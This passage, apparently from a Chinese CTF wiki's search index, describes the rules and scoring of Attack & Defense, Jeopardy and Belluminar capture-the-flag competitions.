Expect\uff3fN\uff0c\u5219\u8fd9\u9053\u9898\u7684\u51fa\u9898\u961f\u4f0d\u5f97\u5230\u7684\u51fa\u9898\u79ef\u5206\u8d8a\u9ad8\u3002 \u89e3\u9898\u79ef\u5206\uff08\u5360\u603b\u79ef\u5206 60%\uff09\u5728\u8ba1\u7b97\u65f6\u4e0d\u8003\u8651 First Blood \u5956\u52b1\u3002 \u5206\u4eab\u79ef\u5206\uff08\u5360 10%\uff09\u7531\u8bc4\u59d4\u548c\u5176\u4ed6\u961f\u4f0d\u6839\u636e\u5176\u6280\u672f\u5206\u4eab\u5185\u5bb9\u8fdb\u884c\u8bc4\u5206\uff08\u8003\u8651\u5206\u4eab\u65f6\u95f4\u4ee5\u53ca\u5176\u4ed6\u9650\u5236\uff09\uff0c\u8ba1\u7b97\u5e73\u5747\u503c\u5f97\u51fa\u3002 \u8d5b\u5236\u603b\u8bc4 \u00b6 \u8d5b\u5236\u4e2d\u5c06 Challenge \u7684\u51fa\u9898\u65b9\u4ea4\u7531\u53d7\u9080\u6218\u961f\uff0c\u8ba9\u6218\u961f\u80fd\u5c3d\u81ea\u5df1\u6240\u80fd\u4e92\u76f8\u51fa\u9898\uff0c\u6bd4\u8d5b\u96be\u5ea6\u548c\u8303\u56f4\u4e0d\u4f1a\u88ab\u4e3b\u529e\u65b9\u6c34\u5e73\u9650\u5236\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u9ad8 Challenge \u7684\u8d28\u91cf\uff0c\u6bcf\u4e2a\u6218\u961f\u90fd\u80fd\u6709\u4e0d\u4e00\u6837\u7684\u4f53\u9a8c\u4e0e\u63d0\u5347\u3002\u5728\"\u5206\u4eab\"\u73af\u8282\uff0c\u5bf9\u672c\u961f\u9898\u76ee\u8fdb\u884c\u8bb2\u89e3\u7684\u540c\u65f6\u4e5f\u5728\u6df1\u5316\u81ea\u5df1\u7684\u80fd\u529b\u6c34\u5e73\uff0c\u5728\u8ba8\u8bba\u56de\u7b54\u7684\u8fc7\u7a0b\u66f4\u662f\u4e00\u79cd\u601d\u7ef4\u4e92\u52a8\u7684\u73af\u8282\u3002\u5728\u8d5b\u540e\u7684\u5b66\u4e60\u603b\u7ed3\u4e2d\u80fd\u5f97\u5230\u66f4\u597d\u7684\u8ba4\u77e5\u3002 \u653b\u9632\u6a21\u5f0f - Attack & Defense \u00b6 \u6982\u8ff0 \u00b6 \u653b\u9632\u6a21\u5f0f\u5e38\u89c1\u4e8e\u7ebf\u4e0b\u51b3\u8d5b\u3002\u5728\u653b\u9632\u6a21\u5f0f\u4e2d\uff0c\u521d\u59cb\u65f6\u523b\uff0c\u6240\u6709\u53c2\u8d5b\u961f\u4f0d\u62e5\u6709\u76f8\u540c\u7684\u7cfb\u7edf\u73af\u5883\uff08\u5305\u542b\u82e5\u5e72\u670d\u52a1\uff0c\u53ef\u80fd\u4f4d\u4e8e\u4e0d\u540c\u7684\u673a\u5668\u4e0a\uff09\uff0c\u5e38\u79f0\u4e3a gamebox\uff0c\u53c2\u8d5b\u961f\u4f0d\u6316\u6398\u7f51\u7edc\u670d\u52a1\u6f0f\u6d1e\u5e76\u653b\u51fb\u5bf9\u624b\u670d\u52a1\u83b7\u53d6 flag \u6765\u5f97\u5206\uff0c\u4fee\u8865\u81ea\u8eab\u670d\u52a1\u6f0f\u6d1e\u8fdb\u884c\u9632\u5fa1\u4ece\u800c\u9632\u6b62\u6263\u5206\uff08\u5f53\u7136\u6709\u7684\u6bd4\u8d5b\u5728\u9632\u5fa1\u4e0a\u4f1a\u8bbe\u7f6e\u5f97\u5206\uff0c\u4e00\u822c\u9632\u5fa1\u53ea\u80fd\u907f\u514d\u4e22\u5206\uff09\u3002 \u653b\u9632\u6a21\u5f0f\u53ef\u4ee5\u5b9e\u65f6\u901a\u8fc7\u5f97\u5206\u53cd\u6620\u51fa\u6bd4\u8d5b\u60c5\u51b5\uff0c\u6700\u7ec8\u4e5f\u4ee5\u5f97\u5206\u76f4\u63a5\u5206\u51fa\u80dc\u8d1f\uff0c\u662f\u4e00\u79cd\u7ade\u4e89\u6fc0\u70c8\uff0c\u5177\u6709\u5f88\u5f3a\u89c2\u8d4f\u6027\u548c\u9ad8\u5ea6\u900f\u660e\u6027\u7684\u7f51\u7edc\u5b89\u5168\u8d5b\u5236\u3002\u5728\u8fd9\u79cd\u8d5b\u5236\u4e2d\uff0c\u4e0d\u4ec5\u4ec5\u662f\u6bd4\u53c2\u8d5b\u961f\u5458\u7684\u667a\u529b\u548c\u6280\u672f\uff0c\u4e5f\u6bd4\u4f53\u529b\uff08\u56e0\u4e3a\u6bd4\u8d5b\u4e00\u822c\u90fd\u4f1a\u6301\u7eed 48 \u5c0f\u65f6\uff09\uff0c\u540c\u65f6\u4e5f\u6bd4\u56e2\u961f\u4e4b\u95f4\u7684\u5206\u5de5\u914d\u5408\u4e0e\u5408\u4f5c\u3002 \u4e00\u822c\u6bd4\u8d5b\u7684\u5177\u4f53\u73af\u5883\u4f1a\u5728\u5f00\u8d5b\u524d\u4e00\u5929\u6216\u8005\u5f53\u5929\u5f00\u8d5b\u524d\u534a\u5c0f\u65f6\u7531\u6bd4\u8d5b\u4e3b\u529e\u65b9\u7ed9\u51fa\uff08\u662f\u4e00\u4efd\u51e0\u9875\u7684\u5c0f\u6587\u6863\uff09\u3002\u5728\u8fd9\u4e00\u6bb5\u65f6\u95f4\u5185\uff0c\u4f60\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684\u6587\u6863\u719f\u6089\u73af\u5883\u5e76\u505a\u597d\u9632\u5fa1\u3002 \u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u534a\u5c0f\u65f6\uff0c\u8fd9\u534a\u5c0f\u65f6\u5185\u662f\u65e0\u6cd5\u8fdb\u884c\u653b\u51fb\u7684\uff0c\u5404\u652f\u961f\u4f0d\u90fd\u4f1a\u52a0\u7d27\u719f\u6089\u6bd4\u8d5b\u7f51\u7edc\u73af\u5883\uff0c\u5e76\u505a\u597d\u9632\u5fa1\u51c6\u5907\u3002\u81f3\u4e8e\u654c\u65b9 Gamebox \u7684 IP \u5730\u5740\uff0c\u5219\u9700\u8981\u9760\u4f60\u81ea\u5df1\u5728\u7ed9\u51fa\u7f51\u6bb5\u4e2d\u53d1\u73b0\u3002 \u5982\u679c\u662f\u5206\u4e3a\u4e0a\u5348\u4e0b\u5348\u4e24\u573a\u653b\u9632\u8d5b\u7684\u8bdd\uff0c\u90a3\u4e48\u4e0a\u5348\u548c\u4e0b\u5348\u7684 Gamebox \u6f0f\u6d1e\u670d\u52a1\u4f1a\u66f4\u6362\uff08\u907f\u514d\u6bd4\u8d5b\u4e2d\u9014\u4f11\u606f\u65f6\u9009\u624b\u4ea4\u6d41\uff09\uff0c\u4f46\u7ba1\u7406\u65f6\u8981\u7528\u7684 IP \u5730\u5740\u4ec0\u4e48\u7684\u4e0d\u4f1a\u6539\u53d8\u3002\u4e5f\u5c31\u662f \u4e0b\u5348\u4f1a\u6362\u65b0\u9898 \u3002 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e3b\u529e\u65b9\u4f1a\u63d0\u4f9b\u7f51\u7ebf\uff0c \u4f46\u5e76\u4e0d\u4f1a\u63d0\u4f9b\u7f51\u7ebf\u8f6c\u63a5\u53e3\uff0c\u6240\u4ee5\u9700\u8981\u81ea\u5907\u3002 \u57fa\u672c\u89c4\u5219 \u00b6 \u653b\u9632\u6a21\u5f0f\u4e00\u822c\u7684\u89c4\u5219\u5982\u4e0b \u6218\u961f\u521d\u59cb\u5206\u6570\u5747\u4e3a x \u5206 \u6bd4\u8d5b\u4ee5 5/10 \u5206\u949f\u4e3a\u4e00\u4e2a\u56de\u5408\uff0c\u6bcf\u56de\u5408\u4e3b\u529e\u65b9\u4f1a\u66f4\u65b0\u5df2\u653e\u51fa\u670d\u52a1\u7684 Flag \u6bcf\u56de\u5408\u5185\uff0c\u4e00\u4e2a\u6218\u961f\u7684\u4e00\u4e2a\u670d\u52a1\u88ab\u6e17\u900f\u653b\u51fb\u6210\u529f\uff08\u88ab\u62ff Flag \u5e76\u63d0\u4ea4\uff09\uff0c\u5219\u6263\u9664\u4e00\u5b9a\u5206\u6570\uff0c\u653b\u51fb\u6210\u529f\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u3002 \u6bcf\u56de\u5408\u5185\uff0c\u5982\u679c\u6218\u961f\u80fd\u591f\u7ef4\u62a4\u81ea\u5df1\u7684\u670d\u52a1\u6b63\u5e38\u8fd0\u884c\uff0c\u5219\u5206\u6570\u4e0d\u4f1a\u51cf\u5c11\uff08\u5982\u679c\u9632\u5fa1\u6210\u529f\u52a0\u5206\u5219\u4f1a\u52a0\u5206\uff09\uff1b \u5982\u679c\u4e00\u4e2a\u670d\u52a1\u5b95\u673a\u6216\u5f02\u5e38\u65e0\u6cd5\u901a\u8fc7\u6d4b\u8bd5\uff0c\u5219\u53ef\u80fd\u4f1a\u6263\u5206\uff0c\u670d\u52a1\u6b63\u5e38\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u3002\u5f80\u5f80\u670d\u52a1\u5f02\u5e38\u4f1a\u6263\u9664\u8f83\u591a\u7684\u5206\u6570\u3002 \u5982\u679c\u8be5\u56de\u5408\u5185\u6240\u6709\u6218\u961f\u7684\u670d\u52a1\u90fd\u5f02\u5e38\uff0c\u5219\u8ba4\u4e3a\u662f\u4e0d\u53ef\u6297\u62d2\u56e0\u7d20\u9020\u6210\uff0c\u5206\u6570\u90fd\u4e0d\u51cf\u5c11\u3002 \u6bcf\u56de\u5408\u5185\uff0c\u670d\u52a1\u5f02\u5e38\u548c\u88ab\u62ff Flag \u53ef\u4ee5\u540c\u65f6\u53d1\u751f\uff0c\u5373\u6218\u961f\u5728\u4e00\u4e2a\u56de\u5408\u5185\u5355\u4e2a\u670d\u52a1\u53ef\u80fd\u4f1a\u6263\u9664\u4e24\u8005\u53e0\u52a0\u7684\u5206\u6570\u3002 \u7981\u6b62\u961f\u4f0d\u4f7f\u7528\u901a\u7528\u9632\u5fa1\u65b9\u6cd5 \u8bf7\u53c2\u8d5b\u961f\u4f0d\u5728\u6bd4\u8d5b\u5f00\u59cb\u65f6\u5bf9\u6240\u6709\u670d\u52a1\u8fdb\u884c\u5907\u4efd\uff0c\u82e5\u56e0\u81ea\u8eab\u539f\u56e0\u670d\u52a1\u6c38\u4e45\u635f\u574f\u6216\u4e22\u5931\uff0c\u65e0\u6cd5\u6062\u590d\uff0c\u4e3b\u529e\u65b9\u4e0d\u63d0\u4f9b\u91cd\u7f6e\u670d\u52a1 \u7981\u6b62\u5bf9\u8d5b\u9898\u4ee5\u5916\u7684\u6bd4\u8d5b\u5e73\u53f0\u53d1\u8d77\u653b\u51fb\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u5728 gamebox \u63d0\u6743 root\u3001\u5229\u7528\u4e3b\u529e\u65b9\u5e73\u53f0\u6f0f\u6d1e\u7b49\uff0c\u8fdd\u89c4\u8005\u7acb\u523b\u53d6\u6d88\u53c2\u8d5b\u8d44\u683c \u53c2\u8d5b\u961f\u4f0d\u5982\u679c\u53d1\u73b0\u5176\u4ed6\u961f\u4f0d\u5b58\u5728\u8fdd\u89c4\u884c\u4e3a\uff0c\u8bf7\u7acb\u523b\u4e3e\u62a5\uff0c\u6211\u4eec\u4f1a\u4e25\u683c\u5ba1\u6838\u5e76\u4f5c\u51fa\u76f8\u5e94\u5224\u7f5a\u3002 \u7f51\u7edc\u73af\u5883 \u00b6 \u6587\u6863\u4e0a\u4e00\u822c\u90fd\u4f1a\u6709\u6bd4\u8d5b\u73af\u5883\u7684 \u7f51\u7edc\u62d3\u6251\u56fe \uff08\u5982\u4e0b\u56fe\uff09\uff0c\u6bcf\u652f\u961f\u4f0d\u4f1a\u7ef4\u62a4\u82e5\u5e72\u7684 Gamebox\uff08\u5df1\u65b9\u670d\u52a1\u5668\uff09 \uff0cGamebox \u4e0a\u90e8\u7f72\u6709\u5b58\u5728\u6f0f\u6d1e\u7684\u670d\u52a1\u3002 \u6587\u6863\u4e0a\u4f1a\u5305\u62ec\u9009\u624b\uff0c\u653b\u9632\u73af\u5883\uff0c\u4e3b\u529e\u65b9\u4e09\u8005\u7684\u73af\u5883\u3002 \u9009\u624b\u9700\u8981\u5728\u4e2a\u4eba\u7535\u8111\u4e0a\u914d\u7f6e\u6216\u8005 DHCP \u81ea\u52a8\u83b7\u53d6 IP \u5730\u5740 \u7f51\u5173 \u63a9\u7801DNS \u670d\u52a1\u5668\u5730\u5740 \u653b\u9632\u73af\u5883 Gamebox \u6240\u5904\u5730\u5740\uff0c\u5305\u62ec\u5df1\u65b9\u548c\u5176\u4ed6\u961f\u4f0d\u7684\u5730\u5740\u3002 \u6bd4\u8d5b\u4e00\u822c\u4f1a\u63d0\u4f9b\u961f\u4f0d\u7684 id \u4e0e\u5bf9\u5e94 ip \u7684\u6620\u5c04\u8868\uff0c\u4ee5\u4fbf\u4e8e\u8ba9\u9009\u624b\u6307\u5b9a\u6070\u5f53\u7684\u653b\u9632\u7b56\u7565\u3002 \u4e3b\u529e\u65b9\u73af\u5883 \u6bd4\u8d5b\u7b54\u9898\u5e73\u53f0 \u63d0\u4ea4 flag \u63a5\u53e3 \u6d41\u91cf\u8bbf\u95ee\u63a5\u53e3 \u8bbf\u95ee Gamebox \u00b6 \u53c2\u8d5b\u6587\u6863\u4e2d\u4f1a\u7ed9\u51fa\u961f\u4f0d\u767b\u5f55 gamebox \u7684\u65b9\u5f0f\uff0c\u4e00\u822c\u6765\u8bf4\u5982\u4e0b \u7528\u6237\u540d\u4e3a ctf \u901a\u8fc7 ssh \u767b\u5f55\uff0c\u5bc6\u7801\u6216\u8005\u79c1\u94a5\uff0c\u4e00\u822c\u4f1a\u7ed9\u51fa\u79c1\u94a5\u3002 \u81ea\u7136\uff0c\u5728\u767b\u5f55\u4e0a\u6218\u961f\u673a\u5668\u540e\u5e94\u8be5\u4fee\u6539\u6240\u6709\u7684\u9ed8\u8ba4\u5bc6\u7801\uff0c\u540c\u65f6\u4e0d\u5e94\u8be5\u8bbe\u7f6e\u5f31\u5bc6\u7801\u3002","title":"Mode"},{"location":"introduction/mode/#-jeopardy","text":"\u89e3\u9898\u6a21\u5f0f\uff08Jeopardy\uff09\u5e38\u89c1\u4e8e\u7ebf\u4e0a\u9009\u62d4\u6bd4\u8d5b\u3002\u5728\u89e3\u9898\u6a21\u5f0f CTF \u8d5b\u5236\u4e2d\uff0c\u53c2\u8d5b\u961f\u4f0d\u53ef\u4ee5\u901a\u8fc7\u4e92\u8054\u7f51\u6216\u8005\u73b0\u573a\u7f51\u7edc\u53c2\u4e0e\uff0c\u53c2\u6570\u961f\u4f0d\u901a\u8fc7\u4e0e\u5728\u7ebf\u73af\u5883\u4ea4\u4e92\u6216\u6587\u4ef6\u79bb\u7ebf\u5206\u6790\uff0c\u89e3\u51b3\u7f51\u7edc\u5b89\u5168\u6280\u672f\u6311\u6218\u83b7\u53d6\u76f8\u5e94\u5206\u503c\uff0c\u4e0e ACM \u7f16\u7a0b\u7ade\u8d5b\u3001\u4fe1\u606f\u5b66\u5965\u8d5b\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u6839\u636e\u603b\u5206\u548c\u65f6\u95f4\u6765\u6392\u540d\u3002 \u76f8\u4e0d\u540c\u7684\u662f\u89e3\u9898\u6a21\u5f0f\u4e00\u822c\u4f1a\u8bbe\u7f6e \u4e00\u8840 \u3001 \u4e8c\u8840 \u3001 \u4e09\u8840 \uff0c\u4e5f\u5373\u6700\u5148\u5b8c\u6210\u7684\u524d\u4e09\u652f\u961f\u4f0d\u4f1a\u83b7\u5f97\u989d\u5916\u5206\u503c\uff0c\u6240\u4ee5\u8fd9\u4e0d\u4ec5\u662f\u5bf9\u9996\u5148\u89e3\u51fa\u9898\u76ee\u7684\u961f\u4f0d\u7684\u5206\u503c\u9f13\u52b1\uff0c\u4e5f\u662f\u4e00\u79cd\u56e2\u961f\u80fd\u529b\u7684\u95f4\u63a5\u4f53\u73b0\u3002 \u5f53\u7136\u8fd8\u6709\u4e00\u79cd\u6d41\u884c\u7684\u8ba1\u5206\u89c4\u5219\u662f\u8bbe\u7f6e\u6bcf\u9053\u9898\u76ee\u7684\u521d\u59cb\u5206\u6570\u540e\uff0c\u6839\u636e\u8be5\u9898\u7684\u6210\u529f\u89e3\u7b54\u961f\u4f0d\u6570\uff0c\u6765\u9010\u6e10\u964d\u4f4e\u8be5\u9898\u7684\u5206\u503c\uff0c\u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u89e3\u7b54\u8fd9\u9053\u9898\u7684\u4eba\u6570\u8d8a\u591a\uff0c\u90a3\u4e48\u8fd9\u9053\u9898\u7684\u5206\u503c\u5c31\u8d8a\u4f4e\u3002\u6700\u540e\u4f1a\u4e0b\u964d\u5230\u4e00\u4e2a\u4fdd\u5e95\u5206\u503c\u540e\u4fbf\u4e0d\u518d\u4e0b\u964d\u3002 \u9898\u76ee\u7c7b\u578b\u4e3b\u8981\u5305\u542b Web \u7f51\u7edc\u653b\u9632 \u3001 RE \u9006\u5411\u5de5\u7a0b \u3001 Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528 \u3001 Crypto \u5bc6\u7801\u653b\u51fb \u3001 Mobile \u79fb\u52a8\u5b89\u5168 \u4ee5\u53ca Misc \u5b89\u5168\u6742\u9879 \u8fd9\u516d\u4e2a\u7c7b\u522b\u3002","title":"\u89e3\u9898\u6a21\u5f0f - Jeopardy"},{"location":"introduction/mode/#-belluminar","text":"\u5728 2016 \u5e74\u4e16\u754c\u9ed1\u5ba2\u5927\u5e08\u6311\u6218\u8d5b\uff08WCTF\uff09\u56fd\u5185\u9996\u6b21\u5f15\u5165\u97e9\u56fd POC SECURITY \u56e2\u961f\u5f00\u521b\u7684 BELLUMINAR CTF \uff08\u6218\u4e89\u4e0e\u5206\u4eab\uff09\u8d5b\u5236\uff0c\u4ece\u6b64\u56fd\u5185\u9646\u9646\u7eed\u7eed\u4e5f\u6709\u5f00\u59cb BELLUMINAR \u6a21\u5f0f\u7684\u6bd4\u8d5b\uff0c\u76ee\u524d\u91c7\u53d6\u8fd9\u4e00\u8d5b\u5236\u7684\u6709 2016 \u5e74\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u96c6\u5408\u7684 XMan \u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u4ee5\u53ca\u540c\u5e74 9 \u6708\u7684\u300c\u767e\u5ea6\u676f\u300dCTF \u6bd4\u8d5b\u3002 \u540c\u65f6\u8fd9\u91cc\u4e5f\u6709 BELLUMINAR \u8d5b\u5236\u7684\u4ecb\u7ecd\u5b98\u7f51\uff1a http://belluminar.org/","title":"\u6218\u4e89\u5206\u4eab\u6a21\u5f0f - Belluminar"},{"location":"introduction/mode/#_1","text":"Belluminar, hacking contest of POC, started at POC2015 in KOREA for the first time. Belluminar is from 'Bellum'(war in Latin) and 'seminar'. It is not a just hacking contest but a kind of festival consisted of CTF & seminar for the solution about challenges. Only invited teams can join Belluminar. Each team can show its ability to attack what other teams want to protect and can defend what others want to attack. \u5982\u5b98\u7f51\u4ecb\u7ecd\u8fd9\u6837\uff0cBELLUMINAR CTF \u8d5b\u5236\u7531\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u76f8\u4e92\u51fa\u9898\u6311\u6218\uff0c\u5e76\u5728\u6bd4\u8d5b\u7ed3\u675f\u540e\u8fdb\u884c\u8d5b\u9898\u7684\u51fa\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u89e3\u9898\u601d\u8def\u7b49\u8fdb\u884c\u5206\u4eab\u3002\u6218\u961f\u8bc4\u5206\u4f9d\u636e\u51fa\u9898\u5f97\u5206\uff0c\u89e3\u9898\u5f97\u5206\u548c\u5206\u4eab\u5f97\u5206\u8fdb\u884c\u7efc\u5408\u8bc4\u4ef7\u5e76\u5f97\u51fa\u6700\u7ec8\u7684\u6392\u540d\u3002","title":"\u8d5b\u5236\u4ecb\u7ecd"},{"location":"introduction/mode/#_2","text":"Each team is required to submit 2 challenges to the challenge bank of the sponsor. \u9996\u5148\u5404\u4e2a\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u90fd\u5fc5\u987b\u5728\u6b63\u5f0f\u6bd4\u8d5b\u524d\u51fa\u9898\uff0c\u9898\u91cf\u4e3a 2 \u9053\u3002\u53c2\u8d5b\u961f\u4f0d\u5c06\u6709 12 \u5468\u7684\u65f6\u95f4\u51c6\u5907\u9898\u76ee\u3002\u51fa\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 30%\u3002 Challenge 1: must be on the Linux platform; Challenge 2: No platform restriction(except Linux) No challenge type restriction (Pwn, Reverse...) \u4f20\u7edf\u7684 BELLUMINAR \u8d5b\u5236\u8981\u6c42\u51fa\u7684\u4e24\u9053\u9898\u4e2d\u4e00\u9053 Challenge \u5fc5\u987b\u662f\u5728 Linux \u5e73\u53f0\uff0c\u53e6\u5916\u4e00\u4e2a\u5219\u4e3a\u975e Linux \u5e73\u53f0\u7684 Challenge\u3002\u4e24\u4e2a Challenge \u7684\u7c7b\u578b\u5219\u6ca1\u6709\u505a\u51fa\u9650\u5236\u3002\u56e0\u6b64\u961f\u4f0d\u53ef\u4ee5\u5c3d\u60c5\u5c55\u73b0\u81ea\u5df1\u7684\u6280\u672f\u6c34\u5e73\u3002 \u4e3a\u4f7f\u6bd4\u8d5b\u9898\u76ee\u7c7b\u578b\u6bd4\u8f83\u5747\u8861\uff0c\u4e5f\u6709\u91c7\u7528\u961f\u4f0d\u62bd\u7b7e\u51fa\u9898\u7684\u65b9\u5f0f\u62bd\u53d6\u81ea\u5df1\u7684\u9898\uff0c\u8fd9\u8981\u6c42\u961f\u4f0d\u80fd\u529b\u6c34\u5e73\u66f4\u4e3a\u5168\u9762\uff0c\u56e0\u6b64\u4e3a\u4e86\u4e0d\u5931\u5e73\u8861\u6027\uff0c\u4e5f\u4f1a\u5c06\u4e24\u9053 Challenge \u7684\u8ba1\u5165\u4e0d\u540c\u5206\u503c\uff08\u6bd4\u5982\u8981\u6c42\u5176\u4e2d\u4e00\u9053 Challenge \u5206\u503c\u4e3a 200\uff0c\u800c\u53e6\u5916\u4e00\u9053\u5206\u503c\u5219\u4e3a 100\uff09\u3002","title":"\u51fa\u9898\u9636\u6bb5"},{"location":"introduction/mode/#_3","text":"\u9898\u76ee\u63d0\u4ea4\u622a\u6b62\u4e4b\u524d\uff0c\u5404\u4e2a\u961f\u4f0d\u9700\u8981\u63d0\u4ea4\u5b8c\u6574\u7684\u51fa\u9898\u6587\u6863\u4ee5\u53ca\u89e3\u9898 Writeup\uff0c\u8981\u6c42\u51fa\u9898\u6587\u6863\u4e2d\u8be6\u7ec6\u6807\u660e\u9898\u76ee\u5206\u503c\uff0c\u9898\u9762\uff0c\u51fa\u9898\u8d1f\u8d23\u4eba\uff0c\u8003\u5bdf\u77e5\u8bc6\u70b9\u5217\u8868\u4ee5\u53ca\u9898\u76ee\u6e90\u7801\u3002\u800c\u89e3\u9898 Writeup \u4e2d\u5219\u9700\u8981\u5305\u542b\u64cd\u4f5c\u73af\u5883\uff0c\u5b8c\u6574\u89e3\u9898\u8fc7\u7a0b\uff0c\u89e3\u9898\u4ee3\u7801\u3002 \u9898\u76ee\u63d0\u4ea4\u4e4b\u540e\u4e3b\u529e\u65b9\u4f1a\u5bf9\u9898\u76ee\u548c\u89e3\u9898\u4ee3\u7801\u8fdb\u884c\u6d4b\u8bd5\uff0c\u671f\u95f4\u51fa\u73b0\u95ee\u9898\u5219\u9700\u8981\u8be5\u9898\u8d1f\u8d23\u4eba\u914d\u5408\u89e3\u51b3\u3002\u6700\u7ec8\u90e8\u7f72\u5230\u6bd4\u8d5b\u5e73\u53f0\u4e0a\u3002","title":"\u63d0\u4ea4\u90e8\u7f72"},{"location":"introduction/mode/#_4","text":"\u8fdb\u5165\u6bd4\u8d5b\u540e\uff0c\u5404\u652f\u961f\u4f0d\u53ef\u4ee5\u770b\u5230\u6240\u6709\u5176\u4ed6\u56e2\u961f\u51fa\u7684\u9898\u76ee\u5e76\u53d1\u8d77\u6311\u6218\uff0c\u4f46\u662f\u4e0d\u80fd\u89e3\u7b54\u672c\u961f\u51fa\u7684\u9898\u76ee\uff0c\u4e0d\u8bbe\u7f6e First Blood \u5956\u52b1\uff0c\u6839\u636e\u89e3\u9898\u79ef\u5206\u8fdb\u884c\u6392\u540d\u3002\u89e3\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 60%\u3002","title":"\u89e3\u9898\u7ade\u6280"},{"location":"introduction/mode/#_5","text":"\u6bd4\u8d5b\u7ed3\u675f\u540e\uff0c\u961f\u4f0d\u4f11\u606f\uff0c\u5e76\u51c6\u5907\u5236\u4f5c\u5206\u4eab PPT\uff08\u4e5f\u53ef\u4ee5\u5728\u51fa\u9898\u9636\u6bb5\u51c6\u5907\u597d\uff09\u3002\u5206\u4eab\u4f1a\u65f6\uff0c\u5404\u961f\u6d3e 2 \u540d\u961f\u5458\u4e0a\u53f0\u8fdb\u884c\u51fa\u9898\u89e3\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u8003\u5bdf\u77e5\u8bc6\u70b9\u7b49\u7684\u5206\u4eab\u3002\u5728\u6f14\u793a\u7ed3\u675f\u540e\u8fdb\u5165\u4e92\u52a8\u8ba8\u8bba\u73af\u8282\uff0c\u89e3\u8bf4\u4ee3\u8868\u9700\u8981\u56de\u7b54\u8bc4\u59d4\u548c\u5176\u4ed6\u9009\u624b\u63d0\u51fa\u7684\u95ee\u9898\u3002\u89e3\u8bf4\u6ca1\u6709\u592a\u5927\u7684\u65f6\u95f4\u9650\u5236\uff0c\u4f46\u662f\u65f6\u95f4\u7528\u91cf\u662f\u8bc4\u5206\u7684\u4e00\u4e2a\u6807\u51c6\u3002","title":"\u5206\u4eab\u8ba8\u8bba"},{"location":"introduction/mode/#_6","text":"\u51fa\u9898\u79ef\u5206\uff08\u5360\u603b\u5206 30%\uff09\u6709 50% \u7531\u8bc4\u59d4\u6839\u636e\u9898\u76ee\u63d0\u4ea4\u7684\u8be6\u7ec6\u7a0b\u5ea6\uff0c\u5b8c\u6574\u8d28\u91cf\uff0c\u63d0\u4ea4\u65f6\u95f4\u7b49\u8fdb\u8bc4\u5206\uff0c\u53e6\u5916 50% \u5219\u6839\u636e\u6bd4\u8d5b\u7ed3\u675f\u540e\u6700\u7ec8\u89e3\u9898\u60c5\u51b5\u8fdb\u884c\u8bc4\u5206\u3002\u8ba1\u5206\u516c\u5f0f\u793a\u4f8b\uff1aScore = MaxScore -- | N -- Expect\uff3fN |\u3002\u8fd9\u91cc N \u662f\u6307\u89e3\u51fa\u8be5\u9898\u7684\u961f\u4f0d\u6570\u91cf\uff0c\u800c Expect\uff3fN \u5219\u662f\u8fd9\u9053\u9898\u9884\u671f\u5e94\u8be5\u89e3\u51fa\u7684\u9898\u76ee\u6570\u91cf\u3002\u53ea\u6709\u5f53\u9898\u76ee\u96be\u5ea6\u9002\u4e2d\uff0c\u89e3\u9898\u961f\u4f0d\u6570\u91cf\u8d8a\u63a5\u8fd1\u9884\u671f\u6570\u91cf Expect\uff3fN\uff0c\u5219\u8fd9\u9053\u9898\u7684\u51fa\u9898\u961f\u4f0d\u5f97\u5230\u7684\u51fa\u9898\u79ef\u5206\u8d8a\u9ad8\u3002 \u89e3\u9898\u79ef\u5206\uff08\u5360\u603b\u79ef\u5206 60%\uff09\u5728\u8ba1\u7b97\u65f6\u4e0d\u8003\u8651 First Blood \u5956\u52b1\u3002 \u5206\u4eab\u79ef\u5206\uff08\u5360 10%\uff09\u7531\u8bc4\u59d4\u548c\u5176\u4ed6\u961f\u4f0d\u6839\u636e\u5176\u6280\u672f\u5206\u4eab\u5185\u5bb9\u8fdb\u884c\u8bc4\u5206\uff08\u8003\u8651\u5206\u4eab\u65f6\u95f4\u4ee5\u53ca\u5176\u4ed6\u9650\u5236\uff09\uff0c\u8ba1\u7b97\u5e73\u5747\u503c\u5f97\u51fa\u3002","title":"\u8ba1\u5206\u89c4\u5219"},{"location":"introduction/mode/#_7","text":"\u8d5b\u5236\u4e2d\u5c06 Challenge \u7684\u51fa\u9898\u65b9\u4ea4\u7531\u53d7\u9080\u6218\u961f\uff0c\u8ba9\u6218\u961f\u80fd\u5c3d\u81ea\u5df1\u6240\u80fd\u4e92\u76f8\u51fa\u9898\uff0c\u6bd4\u8d5b\u96be\u5ea6\u548c\u8303\u56f4\u4e0d\u4f1a\u88ab\u4e3b\u529e\u65b9\u6c34\u5e73\u9650\u5236\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u9ad8 Challenge 